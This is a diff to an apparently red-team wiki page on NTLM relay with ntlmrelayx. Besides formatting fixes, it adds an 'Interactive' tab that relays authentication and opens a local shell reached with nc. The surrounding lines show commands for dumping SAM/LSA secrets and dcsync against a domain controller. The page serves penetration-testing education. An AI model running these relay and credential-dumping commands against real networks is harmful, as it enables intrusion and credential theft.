@@ -56,7 +56,7 @@ In conclusion, session signing is protected by the MIC, which is enabled with th
 * Stealing the session key (CVE-2019-1019)
 
 {% hint style="warning" %}
-As of november 2020, MIC was optional, but [unofficial channels](https://twitter.com/decoder\_it/status/1347976999567032321) suggest it might've become mandatory.
+As of november 2020, MIC was optional, but [unofficial channels](https://twitter.com/decoder_it/status/1347976999567032321) suggest it might've become mandatory.
 {% endhint %}
 
 {% hint style="info" %}
@@ -104,7 +104,7 @@ sed -i 's/HTTP = On/HTTP = Off/g' /PATH/TO/Responder/Responder.conf
 
 Below are different use-cases of ntlmrelayx.
 
-{% tabs %}
+{% tabs fullWidth="false" %}
 {% tab title="Cred dump" %}
 The following command will try to relay the authentication over SMB and attempt a remote [dump of the SAM & LSA secrets](../../../redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets.md) from the target if the relayed victim has the right privileges.
 
@@ -202,6 +202,23 @@ ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'
 ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
 ```
 {% endtab %}
+
+{% tab title="Interactive" %}
+The following command will try to relay the authentication and open a local TCP port (commonly 11000) that the attacker can connect to using tools like `Netcat`.
+
+```
+ntlmrelayx.py -t smb://$TARGET -i
+```
+
+Supported protocols are: LDAP, SMB and MSSQL.
+
+On LDAP and SMB, the attacker will be able execute predefined actions based on the targeted protocol.\
+On MSSQL, the attacker will gain access to an MSSQL shell, similar to using `mssqlclient.py`.
+
+```
+nc 127.0.0.1 11000
+```
+{% endtab %}
 {% endtabs %}
 
 ### Tips & tricks :bulb:
@@ -221,7 +238,7 @@ The ntlmrelayx tool offers features making it a very valuable asset when pentest
 Thanks to [the "multi-relay" feature](https://github.com/SecureAuthCorp/impacket/pull/767), another attacker machine/interface can be added to the targets to combine ntlmrelayx with Responder servers. The attackers will be able capture an NTLM response with a custom challenge on an interface/machine, while relaying on another.
 {% endhint %}
 
-![](../../../.gitbook/assets/capture\_and\_relay.png)
+![](../../../.gitbook/assets/capture_and_relay.png)
 
 {% hint style="info" %}
 The targets file used with the `-tf` option can contain the following
